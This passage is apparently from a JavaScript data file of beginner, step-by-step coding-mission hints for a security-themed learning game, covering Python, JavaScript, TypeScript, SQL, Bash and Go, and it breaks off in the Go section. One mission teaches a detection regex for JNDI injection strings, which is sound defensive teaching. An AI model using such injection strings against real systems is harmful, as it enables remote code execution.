// ROOT//ACCESS step-by-step instructions. One list per mission id, written for someone seeing the concept for the first time.
// Each step is one small action. The hint ladder (curriculum/_guide.js) points learners back to these steps.
(function (g) {
  const RA = g.RA = g.RA || {};
  RA.STEPS = Object.assign(RA.STEPS || {}, {
  // ---------------- Python ----------------
  py1: [
    "Find the line <code>def intro(handle, level):</code>. That line names the function and its two inputs. Leave it exactly as it is.",
    "Delete the <code>pass</code> line. <code>pass</code> means \"do nothing\", which is why the starter fails.",
    "On the indented line underneath, type <code>return</code> followed by a space. Everything after <code>return</code> is what the function hands back.",
    "After <code>return</code>, build the text with an f-string: put <code>f</code> right before the opening quote, then write <code>Agent {handle} // level {level}</code> inside the quotes. The curly braces swap in the real values.",
    "Check the spacing against the example: <code>intro(\"neo\", 3)</code> must give exactly <code>\"Agent neo // level 3\"</code>, with one space either side of <code>//</code>.",
    "Run the checkpoints. If one fails, compare the \"got\" text with the \"want\" text one character at a time."
  ],
  py2: [
    "Keep <code>def threat_level(score):</code> and remove <code>pass</code>.",
    "Write <code>if score >= 90:</code> and on the next, further-indented line <code>return \"CRITICAL\"</code>.",
    "Add <code>elif score >= 60:</code> returning <code>\"HIGH\"</code>, then <code>elif score >= 30:</code> returning <code>\"MEDIUM\"</code>. Python checks these top to bottom and stops at the first true one, so the order matters.",
    "Finish with <code>else:</code> (or just a final line) that returns <code>\"LOW\"</code>.",
    "Test the edges in your head: 90 must be CRITICAL, 59 must be MEDIUM, 0 must be LOW."
  ],
  py3: [
    "Each line is two words, like <code>\"10.0.0.9 FAIL\"</code>. <code>line.split()</code> turns it into <code>[\"10.0.0.9\", \"FAIL\"]</code>, so the IP is at index 0 and the status is at index 1.",
    "Build a set of IPs from the FAIL lines: <code>{line.split()[0] for line in logs if line.split()[1] == \"FAIL\"}</code>. A set throws away duplicates for you.",
    "Wrap it in <code>sorted(...)</code>, which turns the set into a sorted list.",
    "<code>return</code> that sorted list. An empty <code>logs</code> list should give back <code>[]</code>, and this approach already handles it."
  ],
  py4: [
    "Inside <code>make_counter</code>, create a variable to hold the count: <code>count = start</code>.",
    "Still inside <code>make_counter</code>, define an inner function, for example <code>def tick():</code>.",
    "As the first line of <code>tick</code>, write <code>nonlocal count</code>. This tells Python you want to change the outer <code>count</code>, not make a new one.",
    "In <code>tick</code>, add 1 with <code>count += 1</code>, then <code>return count</code>.",
    "Back in <code>make_counter</code> (one indent level out), write <code>return tick</code>, without parentheses. You're handing back the function itself, not calling it.",
    "Each call to <code>make_counter()</code> creates its own private <code>count</code>, so two counters never share a number."
  ],
  py5: [
    "Loop over every character: <code>for ch in text:</code>.",
    "If it isn't a letter (<code>not ch.isalpha()</code>), append it to <code>out</code> unchanged.",
    "For letters, pick the starting code: <code>base = ord(\"A\")</code> for uppercase and <code>ord(\"a\")</code> for lowercase. <code>ord</code> turns a character into a number.",
    "Shift and wrap: <code>(ord(ch) - base + shift) % 26 + base</code>. The <code>% 26</code> wraps z back round to a.",
    "Turn the number back into a character with <code>chr(...)</code> and append it to <code>out</code>.",
    "The starter already ends with <code>return \"\".join(out)</code>, which glues the list back into one string. Keep it."
  ],
  py6: [
    "Keep the import line, then write <code>@dataclass</code> on its own line directly above the class.",
    "Write <code>class Node:</code> with two indented fields: <code>name: str</code> and <code>strength: int = 0</code>.",
    "Add a method <code>def boost(self, n):</code>. Inside it, do <code>self.strength += n</code> and then <code>return self.strength</code>.",
    "Add <code>def __str__(self):</code> returning <code>f\"{self.name}({self.strength})\"</code>. Python calls this when you write <code>str(node)</code>.",
    "Make sure both methods are indented inside the class, at the same level as the fields."
  ],
  py7: [
    "Define your own error type: <code>class AccessDenied(Exception):</code> with <code>pass</code> as its body.",
    "Write <code>def unlock(code):</code>. If <code>code == \"0451\"</code>, return <code>\"OPEN\"</code>.",
    "Otherwise <code>raise AccessDenied(\"bad code\")</code>. Raising stops the function and sends the error up to whoever called it.",
    "Write <code>def safe_unlock(code):</code> with a <code>try:</code> block that does <code>return unlock(code)</code>.",
    "Underneath, add <code>except AccessDenied:</code> and <code>return \"DENIED\"</code>. Catch only this error type, not every possible error."
  ],
  py8: [
    "At the top, add <code>from collections import Counter</code> and <code>import json</code>.",
    "In <code>top_words</code>, lowercase and split the text: <code>text.lower().split()</code> gives you a list of words.",
    "Pass that list to <code>Counter(...)</code>, then call <code>.most_common(n)</code> on it and return the result.",
    "In <code>to_json</code>, call your own <code>top_words(text, n)</code>, wrap it in <code>dict(...)</code>, then return <code>json.dumps(...)</code> of that dict."
  ],
  py9: [
    "Write <code>def chunks(seq, size):</code> and loop over start positions: <code>for i in range(0, len(seq), size):</code>.",
    "Inside the loop, <code>yield list(seq[i:i + size])</code>. <code>yield</code> hands out one chunk at a time instead of building everything up front.",
    "Add <code>import functools</code> at the top, then write <code>def shout(fn):</code>.",
    "Inside <code>shout</code>, decorate an inner function with <code>@functools.wraps(fn)</code> and define <code>def wrapper(*args, **kwargs):</code>.",
    "Have <code>wrapper</code> return <code>fn(*args, **kwargs).upper()</code>, then end <code>shout</code> with <code>return wrapper</code>."
  ],
  py10: [
    "Add <code>import asyncio</code> at the top.",
    "Write <code>async def ping(host):</code>. Inside it, <code>await asyncio.sleep(0)</code> and then <code>return f\"{host}:ok\"</code>.",
    "Write <code>async def sweep(hosts):</code>.",
    "Make one ping per host and run them together: <code>await asyncio.gather(*(ping(h) for h in hosts))</code>. The <code>*</code> spreads them out as separate arguments.",
    "Wrap the result in <code>list(...)</code> and return it. Results come back in the same order as <code>hosts</code>."
  ],
  py11: [
    "Write the signature with type hints: <code>def is_valid_ip(s: str) -> bool:</code>.",
    "Split on dots: <code>parts = s.split(\".\")</code>. If <code>len(parts) != 4</code>, return <code>False</code>.",
    "Loop over the parts. Return <code>False</code> if a part isn't all digits (<code>not p.isdigit()</code>). That also catches empty parts.",
    "Also return <code>False</code> for a leading zero (<code>len(p) > 1 and p[0] == \"0\"</code>) or a number over 255 (<code>int(p) > 255</code>).",
    "If the loop finishes without rejecting anything, return <code>True</code>."
  ],
  py12: [
    "Import <code>Counter</code> and <code>dataclass</code>, and paste in your <code>is_valid_ip</code> from rank 11.",
    "Define <code>@dataclass class Summary:</code> with fields <code>total: int</code>, <code>fails: int</code> and <code>top_ip: str | None</code>.",
    "In <code>analyze(lines)</code>, start <code>total = 0</code> and <code>fail_counts = Counter()</code>.",
    "Loop over the lines and split each one. Skip it with <code>continue</code> if it doesn't have exactly 2 parts or the IP is invalid.",
    "For every valid line, add 1 to <code>total</code>. If the status is <code>\"FAIL\"</code>, add 1 to <code>fail_counts[ip]</code>.",
    "Use <code>fail_counts.most_common(1)</code> to find the top IP, or <code>None</code> if there are no fails. Return <code>Summary(total, sum(fail_counts.values()), top_ip)</code>."
  ],

  // ---------------- JavaScript ----------------
  js1: [
    "Write <code>function intro(handle, level) {</code> and close it with <code>}</code>.",
    "Inside, use <code>return</code> with a template literal, which is text in backticks (<code>`</code>) rather than quotes.",
    "Write <code>`Agent ${handle} // level ${level}`</code>. Each <code>${...}</code> swaps in a value.",
    "Run it. <code>intro(\"neo\", 3)</code> should give exactly <code>\"Agent neo // level 3\"</code>."
  ],
  js2: [
    "Write <code>function threatLevel(score) { ... }</code>.",
    "Check the highest band first: <code>if (score >= 90) return \"CRITICAL\";</code>",
    "Then <code>if (score >= 60) return \"HIGH\";</code> and <code>if (score >= 30) return \"MEDIUM\";</code>",
    "End with <code>return \"LOW\";</code> for everything else. Because each <code>return</code> leaves the function, the order does the work."
  ],
  js3: [
    "Each host is an object like <code>{ name: \"db1\", patched: false }</code>.",
    "Keep only the unpatched ones: <code>hosts.filter(h => !h.patched)</code>. <code>!</code> means \"not\".",
    "Turn each host into its name: <code>.map(h => h.name)</code>.",
    "Sort the names alphabetically with <code>.sort()</code> and return the result. You can chain all three on one line."
  ],
  js4: [
    "Write <code>function makeCounter(start = 0) {</code>. The <code>= 0</code> is the default used when no start is given.",
    "Inside it, make a variable that can change: <code>let count = start;</code>",
    "Return a new function: <code>return function () { count += 1; return count; };</code> (an arrow function <code>() => ++count</code> works too).",
    "The inner function keeps access to <code>count</code> after <code>makeCounter</code> finishes. That's a closure, and each counter gets its own <code>count</code>."
  ],
  js5: [
    "Write <code>function isMalicious(input) { ... }</code>.",
    "Build a regular expression that matches <code>${</code>, optional spaces, then <code>jndi:</code>: <code>/\\$\\{\\s*jndi:/i</code>.",
    "<code>\\$</code> and <code>\\{</code> escape characters that have special meaning in a regex, <code>\\s*</code> means \"any number of spaces\", and the <code>i</code> flag ignores case.",
    "Return <code>regex.test(input)</code>, which gives <code>true</code> or <code>false</code>."
  ],
  js6: [
    "Write <code>class Node {</code> with <code>constructor(name) { this.name = name; this.strength = 0; }</code>",
    "Add <code>boost(n) { this.strength += n; return this.strength; }</code>",
    "Add a getter: <code>get label() { return `${this.name}(${this.strength})`; }</code>. You read it as <code>node.label</code>, without parentheses.",
    "Write <code>class Relay extends Node {</code> with <code>boost(n) { return super.boost(n * 2); }</code>. <code>super</code> calls the parent's version."
  ],
  js7: [
    "Write <code>class AccessDenied extends Error {}</code>. It's a new kind of error you can catch on its own.",
    "Write <code>function unlock(code) {</code>. If <code>code === \"0451\"</code>, return <code>\"OPEN\"</code>.",
    "Otherwise <code>throw new AccessDenied(\"bad code\");</code>",
    "Write <code>function safeUnlock(code) {</code> with <code>try { return unlock(code); }</code>.",
    "Add <code>catch (e) { if (e instanceof AccessDenied) return \"DENIED\"; throw e; }</code>. That handles only your error and passes any other error on."
  ],
  js8: [
    "In <code>tally(items)</code>, create <code>const m = new Map();</code>",
    "Loop: <code>for (const x of items) m.set(x, (m.get(x) ?? 0) + 1);</code>. <code>??</code> uses 0 when the item isn't in the map yet.",
    "Return <code>Object.fromEntries(m)</code> to turn the Map into a plain object.",
    "In <code>topN(items, n)</code>, take <code>Object.entries(tally(items))</code>, sort with <code>(a, b) => b[1] - a[1]</code> (biggest count first), then <code>.slice(0, n)</code>."
  ],
  js9: [
    "Write <code>function* chunks(arr, size) {</code>. The <code>*</code> makes it a generator.",
    "Loop <code>for (let i = 0; i < arr.length; i += size)</code> and <code>yield arr.slice(i, i + size);</code>",
    "Write <code>function* take(iter, n) {</code>. If <code>n <= 0</code>, return straight away.",
    "Loop <code>for (const v of iter)</code>: <code>yield v</code>, count it, and <code>return</code> once you've yielded <code>n</code> values."
  ],
  js10: [
    "Write <code>async function sweep(hosts, ping) {</code>.",
    "Start every ping at once: <code>const results = await Promise.allSettled(hosts.map(h => ping(h)));</code>",
    "Each result has <code>status</code> set to <code>\"fulfilled\"</code> or <code>\"rejected\"</code>. Treat fulfilled results as up and rejected ones as down.",
    "Loop over the results by index, push <code>hosts[i]</code> into <code>up</code> or <code>down</code>, and return <code>{ up, down }</code>."
  ],
  js11: [
    "Start with the easy case: <code>if (a === b) return true;</code>",
    "If either value is <code>null</code> or isn't an object, return <code>false</code>. Remember that <code>typeof null</code> is <code>\"object\"</code>, so check null on its own.",
    "If one is an array and the other isn't, return <code>false</code>. For two arrays, compare lengths, then call <code>deepEqual</code> on each pair of elements.",
    "For objects, compare <code>Object.keys</code> lengths, then check every key with <code>deepEqual(a[k], b[k])</code>.",
    "Calling <code>deepEqual</code> inside itself is called recursion. It lets the function handle objects nested to any depth."
  ],
  js12: [
    "Write <code>async function analyze(source) {</code> and get the lines with <code>const lines = await source();</code>",
    "Set up counters <code>total</code>, <code>skipped</code> and <code>fails</code>, plus a <code>Map</code> of fail counts per IP.",
    "For each line, split on whitespace. If it isn't exactly 2 parts, or the IP isn't four numbers from 0 to 255, add 1 to <code>skipped</code> and <code>continue</code>.",
    "For valid lines, add 1 to <code>total</code>. If the status is <code>\"FAIL\"</code>, add 1 to <code>fails</code> and to that IP's count in the map.",
    "Find the IP with the highest count (starting from <code>null</code>), then return <code>{ total, fails, topIp, skipped }</code>."
  ],

  // ---------------- TypeScript ----------------
  ts1: [
    "Write the signature with types: <code>function intro(handle: string, level: number): string {</code>",
    "The <code>: string</code> after the parentheses is the return type, so TypeScript checks that you really return text.",
    "Return a template literal: <code>return `Agent ${handle} // level ${level}`;</code>",
    "If the compiler complains, read which line it points to. Type errors show up before the code ever runs."
  ],
  ts2: [
    "Declare the allowed values: <code>type Level = \"LOW\" | \"MEDIUM\" | \"HIGH\" | \"CRITICAL\";</code>",
    "Write <code>function threatLevel(score: number): Level {</code>",
    "Return <code>\"CRITICAL\"</code> for 90 and above, <code>\"HIGH\"</code> for 60 and above, <code>\"MEDIUM\"</code> for 30 and above, and <code>\"LOW\"</code> otherwise.",
    "Try a typo such as <code>\"CRITCAL\"</code>: the compiler rejects it because it isn't part of <code>Level</code>. That's the point of this rank."
  ],
  ts3: [
    "Write <code>function tally(items: string[]): Record&lt;string, number&gt; {</code> and start with <code>const out: Record&lt;string, number&gt; = {};</code>",
    "Loop over the items and do <code>out[x] = (out[x] ?? 0) + 1;</code>, then return <code>out</code>.",
    "Write <code>function top(items: string[]): [string, number] | undefined {</code>. If <code>items</code> is empty, return <code>undefined</code>.",
    "Otherwise sort <code>Object.entries(tally(items))</code> by count, biggest first, and return the first entry as a <code>[string, number]</code> tuple."
  ],
  ts4: [
    "Declare <code>interface Report { readonly id: number; source: string; verified?: boolean; }</code>",
    "<code>readonly</code> means the field can't be reassigned, and <code>?</code> means it may be missing.",
    "Write <code>function summarize(r: Report): string {</code>",
    "Return <code>`#${r.id} from ${r.source} ${r.verified === true ? \"[verified]\" : \"[unverified]\"}`</code>. A missing field counts as unverified."
  ],
  ts5: [
    "Declare a function type: <code>type Predicate&lt;T&gt; = (x: T) =&gt; boolean;</code>. <code>T</code> stands in for any type.",
    "Write <code>function where&lt;T&gt;(items: T[], p: Predicate&lt;T&gt;): T[] { return items.filter(p); }</code>",
    "Write <code>function not&lt;T&gt;(p: Predicate&lt;T&gt;): Predicate&lt;T&gt; {</code>",
    "Return a new function that flips the answer: <code>return (x) =&gt; !p(x);</code>"
  ],
  ts6: [
    "Write <code>class Vault {</code> with a field <code>private secrets = new Map&lt;string, string&gt;();</code>",
    "Add <code>constructor(private readonly owner: string) {}</code>. Putting the modifier in the parameter list creates the field for you.",
    "Add <code>store(k: string, v: string): void { this.secrets.set(k, v); }</code> and <code>read(k: string): string | undefined { return this.secrets.get(k); }</code>",
    "Add <code>get size(): number { return this.secrets.size; }</code> and <code>describe(): string</code> returning <code>`${this.owner}: ${this.size} secrets`</code>."
  ],
  ts7: [
    "<code>keyof T</code> means \"one of T's property names\", and <code>T[K]</code> means \"the type of that property\".",
    "Write <code>function pluck&lt;T, K extends keyof T&gt;(items: T[], key: K): T[K][] { return items.map(x =&gt; x[key]); }</code>",
    "Write <code>function indexBy&lt;T, K extends keyof T&gt;(items: T[], key: K): Map&lt;T[K], T&gt; {</code>",
    "Create a <code>new Map&lt;T[K], T&gt;()</code>, call <code>set(x[key], x)</code> for every item, and return the map."
  ],
  ts8: [
    "Declare the union: <code>type Event = { kind: \"login\"; user: string } | { kind: \"breach\"; severity: number } | { kind: \"logout\"; user: string };</code>",
    "Write <code>function describe(e: Event): string {</code> with <code>switch (e.kind) {</code>.",
    "Add <code>case \"login\": return `${e.user} in`;</code>. Inside each case, TypeScript knows exactly which fields exist.",
    "Add the <code>\"breach\"</code> case returning <code>`BREACH sev ${e.severity}`</code> and the <code>\"logout\"</code> case returning <code>`${e.user} out`</code>.",
    "Add <code>default: { const unreachable: never = e; return unreachable; }</code>. If someone adds a new kind later, this line stops compiling."
  ],
  ts9: [
    "<code>Partial&lt;T&gt;</code> is T with every field optional, and <code>Omit&lt;T, K&gt;</code> is T without the field K.",
    "Write <code>function patch&lt;T&gt;(obj: T, changes: Partial&lt;T&gt;): T { return { ...obj, ...changes }; }</code>. Fields that come later win.",
    "Write <code>function redact&lt;T, K extends keyof T&gt;(obj: T, key: K): Omit&lt;T, K&gt; {</code>",
    "Copy the object with <code>const copy = { ...obj };</code>, <code>delete copy[key];</code>, then return <code>copy</code>. Never change the original."
  ],
  ts10: [
    "Write the signature exactly: <code>async function sweep(hosts: string[], ping: (h: string) =&gt; Promise&lt;number&gt;): Promise&lt;Record&lt;string, number&gt;&gt; {</code>",
    "Start every ping together: <code>const ms = await Promise.all(hosts.map(h =&gt; ping(h)));</code>",
    "Build the result object: <code>const out: Record&lt;string, number&gt; = {};</code> and set <code>out[hosts[i]] = ms[i]</code> for every index.",
    "Return <code>out</code>. <code>Promise.all</code> keeps the same order as <code>hosts</code>."
  ],
  ts11: [
    "Declare <code>type Result&lt;T&gt; = { ok: true; value: T } | { ok: false; error: string };</code>",
    "In <code>parsePort(s: string): Result&lt;number&gt;</code>, reject anything that isn't all digits (<code>/^\\d+$/</code>) with <code>{ ok: false, error: \"invalid port\" }</code>.",
    "Convert with <code>Number(s)</code>. If it's from 1 to 65535, return <code>{ ok: true, value: n }</code>, otherwise the same error.",
    "Write the type guard <code>function isOk&lt;T&gt;(r: Result&lt;T&gt;): r is { ok: true; value: T } { return r.ok; }</code>"
  ],
  ts12: [
    "Copy in your <code>Result&lt;T&gt;</code> type, then declare <code>Ev</code> and <code>interface Summary</code> exactly as the task shows.",
    "In <code>parse(line)</code>, split on whitespace. Anything other than an IP followed by <code>OK</code> or <code>FAIL</code> returns <code>{ ok: false, error: ... }</code>.",
    "For good lines, return <code>{ ok: true, value: { kind: status === \"FAIL\" ? \"fail\" : \"ok\", ip } }</code>.",
    "In <code>async function analyze(src)</code>, run <code>await src()</code> and loop. Errors add 1 to <code>errors</code>, good lines add 1 to <code>total</code>, and fails add 1 to <code>fails</code> and to that IP's count.",
    "Pick the IP with the highest count (or <code>null</code>) and return the full <code>Summary</code> object."
  ],

  // ---------------- SQL ----------------
  sql1: [
    "Every query here runs against a practice database with <code>agents</code>, <code>events</code> and <code>nodes</code> tables.",
    "Start with <code>SELECT</code>, then list the columns you want, separated by a comma: <code>name AS handle, faction</code>.",
    "<code>AS handle</code> renames the column in the output only. The table itself doesn't change.",
    "Finish with <code>FROM agents;</code>. The semicolon ends the statement."
  ],
  sql2: [
    "<code>SELECT name, rank FROM agents</code>",
    "Add <code>WHERE faction IN ('sentinel', 'logos')</code>. Text values go in single quotes.",
    "Join the second condition with <code>AND rank >= 3</code>.",
    "Finish with <code>ORDER BY name;</code> so the rows come out alphabetically."
  ],
  sql3: [
    "<code>SELECT DISTINCT ip FROM events</code>. <code>DISTINCT</code> drops repeated rows.",
    "Keep only failures: <code>WHERE status = 'failed'</code>.",
    "Sort: <code>ORDER BY ip</code>. Ascending order is the default.",
    "Limit the output with <code>LIMIT 3;</code> at the very end."
  ],
  sql4: [
    "<code>SELECT ip, COUNT(*) AS fails FROM events WHERE status = 'failed'</code>",
    "Group the rows for each IP together with <code>GROUP BY ip</code>. <code>COUNT(*)</code> then counts per group.",
    "Filter the groups with <code>HAVING COUNT(*) >= 2</code>. <code>WHERE</code> filters rows and <code>HAVING</code> filters groups.",
    "Finish with <code>ORDER BY fails DESC, ip;</code>"
  ],
  sql5: [
    "Give each table a short alias: <code>FROM events e JOIN agents a</code>.",
    "Say how the rows match: <code>ON a.id = e.agent_id</code>.",
    "Pick the columns with their aliases: <code>SELECT a.name, e.ip, e.ts</code>.",
    "Add <code>WHERE e.status = 'failed' ORDER BY e.id;</code>"
  ],
  sql6: [
    "A <code>LEFT JOIN</code> keeps every agent, even ones with no matching event. Their event columns come back as <code>NULL</code>.",
    "<code>SELECT a.name FROM agents a LEFT JOIN events e ON e.agent_id = a.id</code>",
    "Keep only the agents with no events: <code>WHERE e.id IS NULL</code>. Use <code>IS NULL</code>, never <code>= NULL</code>.",
    "Finish with <code>ORDER BY a.name;</code>"
  ],
  sql7: [
    "Start with a named subquery, called a CTE: <code>WITH fails AS (SELECT agent_id, COUNT(*) AS c FROM events WHERE status = 'failed' GROUP BY agent_id)</code>.",
    "Join it to <code>agents</code> to get the names: <code>SELECT a.name, f.c FROM fails f JOIN agents a ON a.id = f.agent_id</code>.",
    "Keep only the top count: <code>WHERE f.c = (SELECT MAX(c) FROM fails)</code>.",
    "Finish with <code>ORDER BY a.name;</code>. If two agents tie, both appear."
  ],
  sql8: [
    "Start with <code>CREATE TABLE safehouses (</code> and list one column per line, separated by commas.",
    "<code>id INTEGER PRIMARY KEY</code> and <code>district TEXT NOT NULL</code>",
    "<code>capacity INTEGER NOT NULL CHECK (capacity > 0)</code>. The database will reject zero or negative capacities.",
    "<code>node_id INTEGER REFERENCES nodes(id)</code>, which links each safe house to a node. Close with <code>);</code>"
  ],
  sql9: [
    "Start the transaction with <code>BEGIN;</code>. Nothing is final until <code>COMMIT</code>.",
    "<code>UPDATE nodes SET online = 0 WHERE district = 'old quarter';</code>",
    "<code>INSERT INTO nodes (district, online) VALUES ('tunnel', 1);</code>",
    "<code>DELETE FROM nodes WHERE district = 'harbor' AND online = 0;</code>",
    "End with <code>COMMIT;</code>"
  ],
  sql10: [
    "An index is a lookup table the database keeps so searches don't scan every row.",
    "<code>CREATE INDEX idx_events_ip_status ON events(ip, status);</code>",
    "<code>CREATE UNIQUE INDEX idx_agents_name ON agents(name);</code>. A unique index also blocks duplicate names.",
    "Two statements, each ending with a semicolon."
  ],
  sql11: [
    "A window function ranks rows inside groups without merging them: <code>RANK() OVER (PARTITION BY faction ORDER BY rank DESC) AS r</code>.",
    "Put it in a CTE: <code>WITH ranked AS (SELECT name, faction, RANK() OVER (...) AS r FROM agents)</code>.",
    "You can't filter on <code>r</code> in the same query that creates it, which is why the CTE is needed.",
    "Then <code>SELECT name, faction, r FROM ranked WHERE r = 1 ORDER BY faction;</code>"
  ],
  sql12: [
    "Start with <code>CREATE VIEW threat_board AS</code>, followed by a normal <code>SELECT</code>.",
    "Select <code>e.ip</code>, <code>COUNT(*) AS fails</code>, <code>COUNT(DISTINCT a.name) AS agents</code> and <code>MAX(e.ts) AS last_seen</code>.",
    "<code>FROM events e JOIN agents a ON a.id = e.agent_id WHERE e.status = 'failed' GROUP BY e.ip;</code>",
    "Then, as a second statement, run <code>SELECT * FROM threat_board ORDER BY fails DESC, ip;</code>"
  ],

  // ---------------- Bash ----------------
  sh1: [
    "Each line of a shell script is one command, run in order, as if you typed it into a terminal.",
    "Make all three folders at once: <code>mkdir -p ops/intel/2026</code>. <code>-p</code> creates any missing parent folders.",
    "Move into the new folder: <code>cd ops/intel/2026</code>.",
    "Create an empty file: <code>touch brief.txt</code>.",
    "List everything in long format, including hidden files: <code>ls -la</code>. <code>-l</code> is long format and <code>-a</code> shows hidden entries."
  ],
  sh2: [
    "<code>grep</code> prints the lines that match a pattern. <code>-i</code> ignores case.",
    "Start with <code>grep -i BLACKOUT relay.log</code>.",
    "Send that output into a second grep with a pipe, <code>|</code>. <code>grep -v TEST</code> keeps the lines that do NOT contain TEST.",
    "Pipe the result into <code>wc -l</code>, which counts lines. The whole thing is one line: <code>grep -i BLACKOUT relay.log | grep -v TEST | wc -l</code>."
  ],
  sh3: [
    "Set a variable with no spaces around the <code>=</code>: <code>TARGET=\"relay.log\"</code>. A space would make Bash treat it as a command.",
    "Capture a command's output with <code>$(...)</code>: <code>STAMP=$(date +%F)</code>.",
    "Count FAIL lines: <code>HITS=$(grep -c FAIL \"$TARGET\")</code>. Keep the double quotes around <code>$TARGET</code>.",
    "Print the sentence: <code>echo \"$STAMP: $HITS failures in $TARGET\"</code>."
  ],
  sh4: [
    "<code>$1</code> is the first argument passed to the script. <code>[[ -z \"$1\" ]]</code> is true when it's empty.",
    "Write <code>if [[ -z \"$1\" ]]; then</code>, then <code>echo \"usage: $0 &lt;file&gt;\"</code> and <code>exit 1</code>.",
    "Add <code>elif [[ -f \"$1\" ]]; then</code> followed by <code>echo \"scanning $1\"</code>. <code>-f</code> means \"is a regular file\".",
    "Add <code>else</code>, then <code>echo \"not found: $1\"</code> and <code>exit 2</code>.",
    "Close the block with <code>fi</code> (\"if\" backwards)."
  ],
  sh5: [
    "Read a file one line at a time: <code>while IFS= read -r host; do</code> ... <code>done &lt; hosts.txt</code>.",
    "<code>IFS=</code> keeps spaces at the edges of a line, and <code>-r</code> keeps backslashes as they are.",
    "Inside the loop, ping once and hide its output: <code>ping -c 1 \"$host\" &amp;&gt;/dev/null</code>.",
    "Chain the result: <code>&amp;&amp; echo \"$host up\" || echo \"$host down\"</code>. <code>&amp;&amp;</code> runs when the ping worked and <code>||</code> runs when it failed."
  ],
  sh6: [
    "Define the function: <code>archive() {</code> ... <code>}</code>",
    "Inside it, <code>local src=\"$1\"</code> and <code>local dest=\"${2:-/tmp}\"</code>. <code>${2:-/tmp}</code> uses /tmp when no second argument is given.",
    "If the source doesn't exist, stop: <code>[[ -e \"$src\" ]] || return 1</code>.",
    "Make the archive: <code>tar -czf \"$dest/$(basename \"$src\").tar.gz\" \"$src\"</code>.",
    "After the function, call it with all the script's arguments: <code>archive \"$@\"</code>."
  ],
  sh7: [
    "Print the first column (the IP) of each line: <code>awk '{ print $1 }' access.log</code>.",
    "Pipe it into <code>sort | uniq -c</code>. <code>uniq -c</code> counts repeated lines next to each other, which is why you sort first.",
    "Sort by count, biggest first, with <code>sort -nr</code>, then keep the first five with <code>head -n 5</code>.",
    "On a new line, redact tokens: <code>sed 's/token=[^ ]*/token=REDACTED/g' app.log &gt; clean.log</code>. <code>[^ ]*</code> matches everything up to the next space."
  ],
  sh8: [
    "File modes are three digits: owner, group, everyone else. 7 = read+write+run, 6 = read+write, 0 = nothing.",
    "<code>chmod 700 sweep.sh</code> lets only the owner use the script.",
    "<code>chmod 600 ~/.ssh/id_ed25519</code> lets only the owner read the private key.",
    "Find the process: <code>PID=$(pgrep cryptominer)</code>.",
    "Ask it to stop: <code>kill -TERM \"$PID\"</code>."
  ],
  sh9: [
    "First line, the shebang: <code>#!/usr/bin/env bash</code>.",
    "Turn on strict mode: <code>set -euo pipefail</code>. The script stops on errors (<code>-e</code>), unset variables (<code>-u</code>) and failures inside pipes (<code>pipefail</code>).",
    "Make a temp folder: <code>WORK=$(mktemp -d)</code>.",
    "Clean it up however the script ends: <code>trap 'rm -rf \"$WORK\"' EXIT</code>.",
    "Check the relay: <code>curl -fsS https://relay.example/health &gt; \"$WORK/health.json\" || { echo \"relay down\" &gt;&amp;2; exit 3; }</code>. <code>&gt;&amp;2</code> sends the message to stderr."
  ],
  sh10: [
    "<code>curl -fsS</code> fetches a URL quietly and fails on HTTP errors.",
    "Add the auth header: <code>-H \"Authorization: Bearer $TOKEN\"</code>, then the URL <code>https://relay.example/api/nodes</code>.",
    "Pipe the JSON into <code>jq -r</code>. <code>-r</code> prints raw text without quotes.",
    "The jq filter: <code>'.nodes[] | select(.online == false) | .name'</code>. It walks every node, keeps the offline ones and prints each name."
  ],
  sh11: [
    "<code>export RELAY_ENV=prod</code> makes the variable visible to programs you start.",
    "Put your folder first on the PATH: <code>export PATH=\"$HOME/ops/bin:$PATH\"</code>.",
    "A cron line has five time fields: minute, hour, day of month, month, day of week. <code>*/15 * * * *</code> means every 15 minutes.",
    "Write the line: <code>*/15 * * * * /opt/ops/sweep.sh &gt;&gt; /var/log/sweep.log 2&gt;&amp;1</code>. <code>&gt;&gt;</code> appends, and <code>2&gt;&amp;1</code> sends errors to the same place."
  ],
  sh12: [
    "Start with the shebang and <code>set -euo pipefail</code>.",
    "Check the log is readable: <code>[[ -r \"${1:-}\" ]] || { echo \"usage: triage.sh &lt;log&gt;\" &gt;&amp;2; exit 1; }</code>. Under strict mode, <code>${1:-}</code> avoids an unset-variable error.",
    "Define <code>top_ips() { awk '{ print $1 }' \"$1\" | sort | uniq -c | sort -nr | head -n 3; }</code>.",
    "Loop over its output: <code>top_ips \"$1\" | while read -r count ip; do</code>.",
    "Inside the loop, <code>if [[ $count -gt 20 ]]; then echo \"block $ip ($count hits)\"; fi</code>, then <code>done</code>.",
    "End with <code>exit 0</code>."
  ],

  // ---------------- Go ----------------
  go1: [
    "Every Go file starts with <code>package main</code>. Add <code>import \"fmt\"</code> below it.",
    "Write <code>func intro(handle string, level int) string {</code>. In Go, the type comes after the name.",
    "Return <code>fmt.Sprintf(\"Agent %s // level %d\", handle, level)</code>. <code>%s</code> is replaced with text and <code>%d</code> with a whole number.",
    "Write <code>func main() {</code> with <code>fmt.Println(intro(\"neo\", 3))</code> inside. Go starts every program at <code>main</code>."
  ],
  go2: [
    "Write <code>func threatLevel(score int) string {</code>",
    "Open a switch with no value: <code>switch {</code>. Each <code>case</code> is then a true/false check.",
    "<code>case score &gt;= 90: return \"CRITICAL\"</code>, then the 60 and 30 cases for HIGH and MEDIUM.",
    "<code>default: return \"LOW\"</code>. Go cases don't fall through, so you don't need <code>break</code>."
  ],
  go3: [
    "Write <code>func tally(ips []string) map[string]int {</code> and create the map with <code>counts := make(map[string]int)</code>.",
    "Loop with <code>for _, ip := range ips { counts[ip]++ }</code>. A missing key starts at 0. The <code>_</code> ignores the index.",
    "Return <code>counts</code>.",
    "Write <code>func uniqueSorted(ips []string) []string {</code>. Build the tally, then collect its keys with <code>out = append(out, k)</code>.",
    "Call <code>sort.Strings(out)</code> (add <code>\"sort\"</code> to your imports) and return <code>out</code>."
  ],
  go4: [
    "Write <code>func makeCounter(start int) func() int {</code>. It returns a function.",
    "Inside, <code>n := start</code>, then <code>return func() int { n++; return n }</code>.",
    "Write <code>func minMax(nums ...int) (min, max int) {</code>. <code>...int</code> accepts any number of ints, and the results are named.",
    "If <code>len(nums) == 0</code>, just <code>return</code>. Otherwise set both to <code>nums[0]</code> and loop, updating <code>min</code> and <code>max</code>.",
    "A plain <code>return</code> sends back the named results."
  ],
  go5: [
    "Write <code>func caesar(text string, shift int) string {</code> and declare <code>var b strings.Builder</code> (import <code>\"strings\"</code>).",
    "Loop over characters: <code>for _, r := range text {</code>. Each <code>r</code> is a rune, Go's word for a character.",
